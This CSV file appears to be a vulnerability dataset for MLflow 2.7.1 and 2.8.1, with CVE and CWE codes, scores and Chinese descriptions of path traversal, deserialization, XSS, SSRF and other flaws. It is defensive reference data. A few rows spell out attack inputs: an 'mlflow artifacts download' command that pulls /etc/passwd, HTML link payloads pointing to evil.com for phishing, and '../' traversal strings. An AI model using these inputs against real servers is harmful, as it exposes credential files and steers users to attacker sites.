mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6014,CWE-598,,MLflow是一个开源的机器学习平台，旨在简化机器学习模型的开发和管理。此漏洞源于MLflow在其服务器和用户界面中实现基本身份验证的不当处理，允许攻击者绕过身份验证。具体而言，攻击者可以利用REST API创建用户/凭据集合，从而未授权访问模型、实验及系统中的其他重要数据。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6015,CWE-22,,MLflow 是一个开源平台，用于简化机器学习开发，包括跟踪实验、将代码打包成可重现的运行并共享和部署模型。受影响的版本存在路径遍历漏洞，该漏洞源于在 `handlers.py` 中的检查被跳过。攻击者可以通过路径遍历攻击从 Windows 的根目录中突破，读取或写入主机上的敏感数据（可能包括 SSH 密钥）。此漏洞仅在 Windows 操作系统上可被利用，利用示例包括发送包含 `C:../` 的请求。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-3573,CWE-29 CWE-22,,Mlflow 是一个开源的机器学习开发平台，旨在简化模型的训练、注册和部署。该平台的漏洞源于其 `is_local_uri` 函数对 URI 的解析不当，使得攻击者能够绕过检查并读取系统上的任意文件。具体来说，该函数未能正确处理空或 'file' 方案的 URI，从而导致误判 URI 为非本地。利用此漏洞，攻击者可以通过创建恶意模型版本并巧妙构造 'source' 参数，读取到服务器根目录下至少两个目录层级内的敏感文件。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-1560,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在帮助用户简化机器学习模型的管理和部署。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于无法正确清理用户提供的路径，攻击者可以利用该漏洞删除服务器文件系统上的任意目录。该漏洞的根本原因是`local_artifact_repo.py`中的`delete_artifacts`函数存在额外的url反转操作，导致无法有效防止路径遍历序列的出现。攻击者可以利用`_delete_artifact_mlflow_artifacts`处理程序和`local_file_uri_to_path`函数中的双重解码过程来触发该漏洞。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-3848,CWE-29 CWE-22,,mlflow 是一个用于简化机器学习开发的开源平台，允许跟踪实验、将代码打包为可重现的运行，并分享和部署模型。受影响的版本 2.11.0 存在路径遍历漏洞，该漏洞源于对创建的 artifact URL 的片段部分验证不当。攻击者可以通过构造特定的 URL（使用 '#' 字符插入路径）来绕过验证，进而访问文件系统路径，从而读取任意文件，包括敏感信息如 SSH 和云密钥。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-4263,CWE-284,,Mlflow 是一个用于简化机器学习开发的开源平台，提供跟踪实验、将代码包装为可重复运行的代码以及共享和部署模型的功能。Mlflow 2.10.1 之前的版本在处理用户 EDIT 权限的 DELETE 请求时缺乏适当的验证，这导致低权限攻击者能够在未授权的情况下删除任何工件。这种漏洞的根本原因在于访问控制的错误实现，允许攻击者以其低权限删除包括目录在内的工件。这种不当访问控制使得原本只能读取和更新工件的用户能够进行删除操作。,3,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-1558,CWE-22,,Mlflow 是一个机器学习生命周期的开源平台。该漏洞源于对 'source' 参数验证不当。在 `_create_model_version` 函数中，攻击者可以发送特制的 `source` 参数，绕过 `_validate_non_local_source_contains_relative_paths(source)` 函数的检查，从而获得对服务器上任意文件的读取访问权限。这一问题源于处理未加引号的URL字符及在模型版本创建时错误地使用原始 'source' 值，导致在与 `/model-versions/get-artifact` 处理程序交互时敏感文件暴露。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-1483,CWE-22,,Mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括跟踪实验、打包代码并分享和部署模型。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于对用户输入验证不足。攻击者可以通过构造特定的HTTP POST请求，利用 'artifact_location' 和 'source' 参数，使用包含 '#' 组件的本地URI，访问服务器上的任意文件。这种攻击利用了目录遍历，允许攻击者访问服务器上不应被公开的文件。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-1593,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该平台用于简化机器学习开发，包括实验跟踪、将代码打包为可重复运行的程序以及共享和部署模型。Mlflow存在路径遍历漏洞，该漏洞源于对URL参数处理不当。攻击者可以利用;字符在URL中传递路径遍历序列，从而操控URL的params部分，获得对系统中文件或目录的未授权访问。攻击者可以使用像'../'这样的路径序列，访问存储在文件系统中任意的文件或目录。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-1594,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该漏洞存在于Mlflow 2.9.2版本及更早版本中，攻击者可以利用该漏洞在创建实验时，通过操纵'artifact_location'参数来触发路径遍历攻击。在URI中使用片段组件'#'，攻击者可以读取服务器上任意文件。这个漏洞类似于CVE-2023-6909，但利用了URI中的不同组件来达到相同效果。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6018,CWE-78,,MLflow 是一个开源的平台，用于简化机器学习的开发流程，包括实验的跟踪、代码的封装和模型的共享与部署。在受到影响的版本中，通过对 `/ajax-api/2.0/mlflow/model-versions/create` 的请求，存在操作系统命令注入漏洞。攻击者可以利用此漏洞覆盖 MLflow 服务器上的任意文件，从而在受影响的机器上执行命令并获取数据和模型信息。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37053,CWE-502,2024-06-04,在使用版本1.1.0或更高版本的MLflow平台中，可能会发生不可信数据的反序列化。恶意上传的scikit-learn模型在被用户交互时，可以在用户系统上运行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37054,CWE-502,2024-06-04,在运行版本0.9.0或更新版本的MLflow平台中，可能会发生不可信数据的反序列化，允许恶意上传的PyFunc模型在与之交互时在最终用户系统上运行任意代码。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37060,CWE-502,2024-06-04,在运行版本1.27.0或更高版本的MLflow平台中，可能会发生不受信任数据的反序列化，从而使恶意构造的Recipe在运行时在最终用户系统上执行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37052,CWE-502,2024-06-04,MLflow 平台在版本 1.1.0 及更高版本中存在反序列化未受信任数据的漏洞。攻击者可以通过上传恶意的 scikit-learn 模型，在用户与模型交互时执行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37056,CWE-502,2024-06-04,在版本1.23.0及以上的MLflow平台中，反序列化未受信任数据的漏洞允许恶意上传的LightGBM scikit-learn模型在用户系统上运行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37061,CWE-94,2024-06-04,MLflow 是一个开源的平台，用于管理机器学习生命周期，包括实验、可重复运行和模型部署。当版本为1.11.0及更高版本的MLflow被使用时，存在远程代码执行漏洞。攻击者可以通过上传特制的MLproject文件，在系统上执行任意代码。该文件会诱导系统加载恶意代码，从而允许执行。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37055,CWE-502,2024-06-04,在运行版本1.24.0或更新版本的MLflow平台中，存在反序列化不受信任数据的漏洞。该漏洞允许恶意上传的pmdarima模型在与用户交互时在用户系统上运行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37057,CWE-502,2024-06-04,在运行版本2.0.0rc0或更新版本的MLflow平台中，存在反序列化不受信任数据的漏洞。该漏洞允许恶意上传的Tensorflow模型在与用户系统交互时运行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37058,CWE-502,2024-06-04,MLflow 平台 2.5.0 及以上版本存在反序列化未受信任数据的漏洞。攻击者可以通过上传恶意的 Langchain AgentExecutor 模型，在用户与之交互时执行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-6838,CWE-400,,MLflow是一个开源的机器学习开发平台，旨在简化机器学习项目的管理，提供实验跟踪、模型部署等功能。在MLflow版本v2.13.2中，由于实验名称缺少限制，存在安全漏洞，允许创建或重命名实验时使用大量整数，这可能导致MLflow用户界面失去响应，从而导致拒绝服务。此外，在创建实验时，`artifact_location`参数也没有字符限制。,3,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2025-0453,CWE-410,,MLFlow 是一个开源的机器学习平台，旨在简化机器学习工作流的管理。在 MLFlow 版本 2.17.2 中，`/graphql` 端点存在拒绝服务攻击（DoS）的漏洞。攻击者可以创建大量复杂的查询批次，反复请求特定实验下的所有运行记录，导致 MLFlow 分配的所有工作者被大量请求占用，无法响应其他请求。这一漏洞源于对资源消耗的未受控管理。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2025-52967,CWE-918,2025-06-23,MLflow是一款用于管理机器学习生命周期的开源平台，涵盖了实验跟踪、项目部署和模型管理等功能。该漏洞涉及MLflow中的gateway_proxy_handler组件，该组件负责处理网关路径请求，然而在版本3.1.0之前，其路径验证功能存在缺失。这种缺陷使得某些未经验证的输入可以通过此组件传递，可能导致非法请求被接收和处理。,3,2
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-27134,CWE-276 CWE-367,2024-11-25,MLflow 是一个开源的平台，旨在简化机器学习开发，它包括了管理和跟踪实验、将代码打包成可重复的运行以及共享和部署模型的能力。在 MLflow 中，由于目录权限设置过多，使用 spark_udf 功能时存在本地特权升级的漏洞。这意味着攻击者可以通过利用这一漏洞获得更高的系统权限，从而执行未授权的操作。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2025-1473,CWE-352,,mlflow 是一个开源的机器学习平台，旨在管理机器学习生命周期的各个方面，包括实验跟踪、项目包装和模型部署。在版本 2.17.0 到 2.20.1 的注册功能中，存在跨站请求伪造（CSRF）漏洞。攻击者可以利用这一漏洞创建新账户，从而可在恶意用户的名义下执行未经授权的操作。这一漏洞的根本原因是对 CSRF 攻击缺乏足够的防护和验证，特别是在处理用户注册请求时。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-8859,CWE-29,,MLflow是一个开源的平台，旨在简化机器学习开发，包括跟踪实验、打包代码和共享模型。在MLflow的2.15.1版本中，发现了一个路径遍历漏洞，该漏洞源于dbfs服务的不当配置。具体而言，漏洞发生在`_validate_non_local_source_contains_relative_paths()`函数中，当`dbfs`服务被配置并挂载到本地目录而不是Databricks时，攻击者可以通过操纵`file:`协议中的URL读取任意文件，因为该实现未能适当清理路径之外的输入，如查询和参数。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2025-1474,CWE-521,,在 MLflow 版本 2.18 中，管理员可以在未设置密码的情况下创建新用户账户。MLflow 是一个开源的机器学习平台，旨在简化机器学习的开发和管理。由于缺乏对设置密码的要求，该漏洞可能导致未授权访问，从而引发安全风险。此外，这一做法违反用户账户安全管理的最佳实践。该漏洞已在版本 2.19.0 中修复。,3,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供实验跟踪、模型管理等功能。在测试过程中发现，当用户访问日志中的 PDF 工件时，存在定制 JavaScript 执行的漏洞。该漏洞是由项目的默认安装中使用的易受攻击的 PDFjs 封装导致的。攻击者可以通过上传特制的 PDF 文件来引发 JavaScript 的执行，从而影响其他用户。</p>,3,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow是一个开源的机器学习平台，允许数据科学家和开发者使用不同的工具进行机器学习模型的构建和管理。在AWS上，发现一个未被声明的S3存储桶，攻击者可以声称这个存储桶并获得对它的控制权。这种漏洞的根本原因是对S3存储桶的管理不当，导致存储桶处于可被恶意接管的状态。攻击者可通过直接访问未声明的S3存储桶地址，执行接管操作。</p>,2,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的整个生命周期，包括实验、重现和部署。该漏洞存在于 Github Actions 的工作流中，攻击者可以提交包含可执行代码的恶意 Pull Request，这些代码在没有适当授权的情况下执行，从而导致敏感令牌泄露并危及代码库的安全。</p>,1,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的开发、实验和部署。当一个页面未能设置适当的 X-Frame-Options 或 Content-Security-Policy HTTP 头时，攻击者可以在其控制的页面中通过 iframe 加载受影响的页面。这种漏洞的根本原因在于缺乏必要的防护措施。攻击者可通过在用户的浏览器中叠加一个虚假的用户界面，诱使受害者进行诸如鼠标点击和键盘输入等操作，进而在被攻击的应用中无意执行指令。</p>,4,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理工具，允许用户追踪实验、项目和最终模型。在使用 mlflow cli 命令下载工件时，存在本地文件包含漏洞，攻击者可以通过提供不安全的 URI 来下载服务器上任何位置的文件。攻击者可以利用这一漏洞，执行类似 'mlflow artifacts download -u /etc/passwd -d /home/ubuntu/test/' 的命令，将 /etc/passwd 的内容下载到本地目录，从而暴露敏感信息。</p>,2,1
mlflow_mlflow,mlflow,2.7.1,True,,,,"<p>mlflow是一个开源的机器学习平台，旨在简化并优化机器学习模型的管理和部署。当使用`dangerouslySetInnerHTML`方法渲染用户输入的内容时，如果未采取适当的输入验证，就会导致HTML注入漏洞。攻击者可以通过存储恶意HTML代码创建假网页，例如使用标记<a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">click here to get gift</a>来实施钓鱼攻击，将受害者重定向到另一个网站。</p>",3,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow是一个用于机器学习生命周期管理的开源平台，支持多种机器学习模型的实验跟踪、项目管理和模型部署。该漏洞源于使用pickle.load函数不当，攻击者可以借此加载恶意构造的pickle文件。当用户从互联网下载一个模型并使用该框架检查模型训练结果时，可能会触发代码执行。具体的执行流程是，当检查'train'步骤时，会调用inspect函数，继而调用BaseCard.load方法加载卡片模型，这一过程可能导致任意代码执行。</p>,3,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>MLflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发者管理整个机器学习生命周期。该漏洞存在于用户输入未被恰当验证和清理的情况下，导致攻击者能够通过 XSS 注入虚假的登录表单或欺骗性用户界面到合法网页中。攻击者可以在这些虚假表单中窃取敏感信息，例如用户名、密码或信用卡详细信息。具体地，在使用 `render_template_string` 函数时，如不对用户输入进行适当转义，用户控制的值即可能成为 JavaScript 代码的来源，最终导致跨站脚本攻击的发生。</p>,3,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>MLflow 是一个开源平台，用于管理机器学习生命周期，包括实验跟踪、项目打包和模型管理。在创建实验时，当使用 POST 请求向 /ajax-api/2.0/mlflow/experiments/create 发送包含相同名称的实验的请求时，系统原本应该检查该实验名称是否已经存在，并返回错误信息。然而，由于存在竞争条件，多个同时请求可以成功创建相同名称的实验。这种漏洞的根源在于对并发请求的处理不当，导致了一致性问题和安全隐患。</p>,3,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow 是一个用于管理机器学习生命周期的开源平台，它提供模型训练、记录和模型部署的功能。当用户上传数据集时，由于使用 MD5 哈希值作为数据集标识符，可能导致哈希冲突，从而阻止新的数据集上传。攻击者可以利用此漏洞，通过提前创建具有相同名称和内容的已知数据集，从而占用相应的MD5哈希值，导致其他用户无法上传同名数据集。</p>,3,1
mlflow_mlflow,mlflow,2.7.1,True,,,,"<p>MLflow 是一个用于管理机器学习生命周期的开源平台，支持实验记录、模型部署和系列管理。该平台存在HTML/XSS注入漏洞，攻击者可以通过在网页表单或输入字段中注入恶意代码，从而使用户在浏览网页时被重定向到恶意网站。攻击者可以利用该漏洞通过修改描述字段来注入HTML代码，例如用 <a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">submit your report here </a>，从而实现用户重定向。在用户保存后，该链接将出现在用户界面上，点击后会将用户重定向到恶意网站。</p>",2,1
mlflow_mlflow,mlflow,2.7.1,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供了模型登记、追踪实验和模型部署等功能。该漏洞存在于 mlflow 的文件操作中，攻击者可以通过重写 YAML 文件中的敏感字段，导致远程代码执行或本地文件读取。具体来说，当调用 `write_yaml()` 函数并设置 `overwrite=True` 时，系统未能正确验证文件内容的有效性，攻击者能够覆盖关键属性如 `source` 和 `storage_location`，并在多种情况下利用此漏洞。</p>,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-37059,CWE-502,2024-06-04,在运行版本0.5.0或更新版本的MLflow平台中，反序列化不可信数据时会出现漏洞，允许恶意上传的PyTorch模型在用户系统上执行任意代码。,2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2025-11201,CWE-22,2025-10-29,MLflow Tracking Server 是一个用于管理机器学习模型生命周期的开源平台，包括实验记录、模型注册和模型部署等功能。在该漏洞中，受影响组件在处理模型文件路径时，缺乏对用户输入路径的正确验证，导致攻击者能够构造恶意路径并触发文件操作。这种漏洞通常是由于未正确验证输入数据或未限制目录访问范围所引起的。攻击者可以利用构造的路径执行任意代码，具体地是在服务账户的权限上下文中执行代码。,1,2
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-0520,CWE-22,,Mlflow是一个开源的平台，用于简化机器学习开发的生命周期，包括实验跟踪、代码打包和模型共享与部署。该漏洞源于`mlflow.data.http_dataset_source.py`模块中操作系统命令的特殊元素未得到正确中和，攻击者可以通过操控`Content-Disposition`头部中的文件名或URL路径包含恶意输入来执行任意代码。此漏洞允许攻击者完全控制文件路径，通过路径遍历或绝对路径技术，实现任意文件写入，例如用'../../tmp/poc.txt'或'/tmp/poc.txt'。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-3099,CWE-475,,Mlflow 是一个用于简化机器学习开发的开源平台，支持跟踪实验、打包可重复的运行和共享与部署模型。该漏洞源于对模型名称的验证不足，允许攻击者通过 URL 编码创建多个同名模型，因此可能导致拒绝服务（DoS），同时攻击者还可以利用此漏洞对数据模型进行污染。由于 URL 编码的模型在处理时被视为与其解码版本不同，从而导致了这一安全问题。,3,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-2928,CWE-29 CWE-22,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括实验跟踪、代码打包以及模型的共享与部署。该平台存在安全漏洞，主要由于在解析 URI 片段时未能妥善验证其内容。攻击者可以通过操纵 URI 片段的部分，利用目录遍历序列如 '../' 来读取本地文件系统上的任意文件，甚至包括敏感文件如 '/etc/passwd'。该漏洞是对之前补丁的绕过，表明需要对 URI 的所有部分进行全面验证以防止本地文件包含攻击。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-27133,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 dataset table字段的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-27132,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 template变量的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6977,CWE-29,,MLflow 是一个用于简化机器学习开发的开源平台，支持实验跟踪、代码打包以及模型的共享和部署。在版本 2.9.2 之前的 MLflow 中，存在一个安全漏洞。该漏洞源于 `is_local_uri()` 函数未能正确验证 URI，攻击者可以利用此漏洞从主机服务器下载任意文件，包括任何主机服务器可以访问的远程位置的文件。该漏洞允许攻击者读取服务器上的敏感文件。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6909,CWE-29,,MLflow 是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。受影响的版本在处理特制的文件路径时存在路径遍历问题，攻击者可能利用此漏洞读取或写入限制目录外的文件，这主要是由于在特定函数 `validate_path_is_safe` 中对路径的不足消毒所致。利用此漏洞时，攻击者提交经过设计的文件路径，可能包括 `..\` 序列，造成对任意文件的访问。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6975,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，具有实验跟踪、代码打包和模型共享等功能。存在路径遍历漏洞，攻击者可以通过特制的路径输入（利用目录遍历序列）来获取未授权的读或写权限，从而访问服务器上的文件。该漏洞源于对 FTP 模型中的路径验证的不当处理，允许攻击者进行远程代码执行，并检索数据和模型信息。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6976,CWE-434,,MLflow 是一个开放源代码的平台，用于简化机器学习开发，包括追踪实验、将代码打包为可重复运行的代码和共享及部署模型。受影响的版本存在目录遍历漏洞，通过在路径名中包含 `#` 可以绕过 `validate_path_is_safe()` 检查，从而允许攻击者向服务器上任意位置写入文件。该漏洞可以通过恶意的 `zip` 压缩包利用，导致路径遍历，最终在服务器的文件系统中写入恶意代码。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6974,CWE-918,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习项目的开发与管理。然而，MLflow 存在一个服务器端请求伪造 (SSRF) 漏洞。该漏洞的根本原因在于在处理 HTTP 请求时未能正确限制重定向行为，攻击者可以利用 `_download_file()` 函数触发此漏洞，访问内部资源并实现任意文件写入。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6940,CWE-77,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发、跟踪和部署。此漏洞源于对 jinja2 模板引擎的处理不当，攻击者可以利用其绕过安全限制，从而在受害者的系统上进行完整的命令执行。受影响的版本为 1.27.0 至 2.9.1，攻击者只需通过一次用户交互（例如下载恶意配置）即可发起攻击。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6831,CWE-29 CWE-22,,Mlflow是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。在版本2.9.2之前，Mlflow存在路径遍历漏洞。该漏洞的根本原因是对文件处理机制中传入的特殊输入没有进行适当的检查。攻击者可以通过对路径的URL编码来绕过安全验证。利用该漏洞，攻击者可以在受害者服务器上删除任意文件，具体取决于用户的权限。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6753,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在简化机器学习开发过程，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。在Mlflow的2.9.2之前版本中，存在路径遍历漏洞，此漏洞源于在加载数据集时未能正确处理URL路径，允许攻击者通过操控URL路径中的文件名，利用后斜杠来绕过目录限制，实现写入当前工作目录以外的文件。例如，通过构造恶意URL，用户可以被诱骗加载攻击者指定的文件，从而造成任意文件写入。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6709,CWE-1336,,Mlflow是一个机器学习生命周期的开源平台。该平台允许用户跟踪实验、打包代码为可重现的运行并共享和部署模型。Mlflow的2.9.2之前的版本存在安全漏洞，源于模板引擎中对特殊元素的处理不当。攻击者可以通过注入恶意输入到模板系统，从而在用户机器上执行任意代码。为了利用此漏洞，用户必须加载其在互联网上找到的配方配置。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6568,CWE-79,,Mlflow 是一个开源机器学习生命周期管理平台，允许用户跟踪实验、打包代码以及共享和部署模型。受影响版本在 2.9.0 之前，存在跨站脚本漏洞。攻击者可以通过在 POST 请求的 Content-Type 头中注入恶意代码，这些代码在缺乏适当消毒或转义的情况下反射回用户。这可能导致用户会话被劫持、敏感信息被窃取或在用户代理的上下文中执行其他恶意操作。,3,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-43472,CWE-200,2023-12-05,MLflow 是一个用于管理机器学习生命周期的开源平台，提供了实验追踪、模型管理、项目打包等功能。MLflow 2.8.1版本及之前的版本存在一个安全漏洞，原因是特制 REST API 请求的处理不当。攻击者可以通过发送特制的 REST API 请求来获取敏感信息。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6014,CWE-598,,MLflow是一个开源的机器学习平台，旨在简化机器学习模型的开发和管理。此漏洞源于MLflow在其服务器和用户界面中实现基本身份验证的不当处理，允许攻击者绕过身份验证。具体而言，攻击者可以利用REST API创建用户/凭据集合，从而未授权访问模型、实验及系统中的其他重要数据。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-3573,CWE-29 CWE-22,,Mlflow 是一个开源的机器学习开发平台，旨在简化模型的训练、注册和部署。该平台的漏洞源于其 `is_local_uri` 函数对 URI 的解析不当，使得攻击者能够绕过检查并读取系统上的任意文件。具体来说，该函数未能正确处理空或 'file' 方案的 URI，从而导致误判 URI 为非本地。利用此漏洞，攻击者可以通过创建恶意模型版本并巧妙构造 'source' 参数，读取到服务器根目录下至少两个目录层级内的敏感文件。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-1560,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在帮助用户简化机器学习模型的管理和部署。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于无法正确清理用户提供的路径，攻击者可以利用该漏洞删除服务器文件系统上的任意目录。该漏洞的根本原因是`local_artifact_repo.py`中的`delete_artifacts`函数存在额外的url反转操作，导致无法有效防止路径遍历序列的出现。攻击者可以利用`_delete_artifact_mlflow_artifacts`处理程序和`local_file_uri_to_path`函数中的双重解码过程来触发该漏洞。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-3848,CWE-29 CWE-22,,mlflow 是一个用于简化机器学习开发的开源平台，允许跟踪实验、将代码打包为可重现的运行，并分享和部署模型。受影响的版本 2.11.0 存在路径遍历漏洞，该漏洞源于对创建的 artifact URL 的片段部分验证不当。攻击者可以通过构造特定的 URL（使用 '#' 字符插入路径）来绕过验证，进而访问文件系统路径，从而读取任意文件，包括敏感信息如 SSH 和云密钥。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-4263,CWE-284,,Mlflow 是一个用于简化机器学习开发的开源平台，提供跟踪实验、将代码包装为可重复运行的代码以及共享和部署模型的功能。Mlflow 2.10.1 之前的版本在处理用户 EDIT 权限的 DELETE 请求时缺乏适当的验证，这导致低权限攻击者能够在未授权的情况下删除任何工件。这种漏洞的根本原因在于访问控制的错误实现，允许攻击者以其低权限删除包括目录在内的工件。这种不当访问控制使得原本只能读取和更新工件的用户能够进行删除操作。,3,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-1558,CWE-22,,Mlflow 是一个机器学习生命周期的开源平台。该漏洞源于对 'source' 参数验证不当。在 `_create_model_version` 函数中，攻击者可以发送特制的 `source` 参数，绕过 `_validate_non_local_source_contains_relative_paths(source)` 函数的检查，从而获得对服务器上任意文件的读取访问权限。这一问题源于处理未加引号的URL字符及在模型版本创建时错误地使用原始 'source' 值，导致在与 `/model-versions/get-artifact` 处理程序交互时敏感文件暴露。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-1483,CWE-22,,Mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括跟踪实验、打包代码并分享和部署模型。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于对用户输入验证不足。攻击者可以通过构造特定的HTTP POST请求，利用 'artifact_location' 和 'source' 参数，使用包含 '#' 组件的本地URI，访问服务器上的任意文件。这种攻击利用了目录遍历，允许攻击者访问服务器上不应被公开的文件。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-1593,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该平台用于简化机器学习开发，包括实验跟踪、将代码打包为可重复运行的程序以及共享和部署模型。Mlflow存在路径遍历漏洞，该漏洞源于对URL参数处理不当。攻击者可以利用;字符在URL中传递路径遍历序列，从而操控URL的params部分，获得对系统中文件或目录的未授权访问。攻击者可以使用像'../'这样的路径序列，访问存储在文件系统中任意的文件或目录。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-1594,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该漏洞存在于Mlflow 2.9.2版本及更早版本中，攻击者可以利用该漏洞在创建实验时，通过操纵'artifact_location'参数来触发路径遍历攻击。在URI中使用片段组件'#'，攻击者可以读取服务器上任意文件。这个漏洞类似于CVE-2023-6909，但利用了URI中的不同组件来达到相同效果。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2023-6018,CWE-78,,MLflow 是一个开源的平台，用于简化机器学习的开发流程，包括实验的跟踪、代码的封装和模型的共享与部署。在受到影响的版本中，通过对 `/ajax-api/2.0/mlflow/model-versions/create` 的请求，存在操作系统命令注入漏洞。攻击者可以利用此漏洞覆盖 MLflow 服务器上的任意文件，从而在受影响的机器上执行命令并获取数据和模型信息。,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37053,CWE-502,2024-06-04,在使用版本1.1.0或更高版本的MLflow平台中，可能会发生不可信数据的反序列化。恶意上传的scikit-learn模型在被用户交互时，可以在用户系统上运行任意代码。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37054,CWE-502,2024-06-04,在运行版本0.9.0或更新版本的MLflow平台中，可能会发生不可信数据的反序列化，允许恶意上传的PyFunc模型在与之交互时在最终用户系统上运行任意代码。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37060,CWE-502,2024-06-04,在运行版本1.27.0或更高版本的MLflow平台中，可能会发生不受信任数据的反序列化，从而使恶意构造的Recipe在运行时在最终用户系统上执行任意代码。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37052,CWE-502,2024-06-04,MLflow 平台在版本 1.1.0 及更高版本中存在反序列化未受信任数据的漏洞。攻击者可以通过上传恶意的 scikit-learn 模型，在用户与模型交互时执行任意代码。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37056,CWE-502,2024-06-04,在版本1.23.0及以上的MLflow平台中，反序列化未受信任数据的漏洞允许恶意上传的LightGBM scikit-learn模型在用户系统上运行任意代码。,2,0
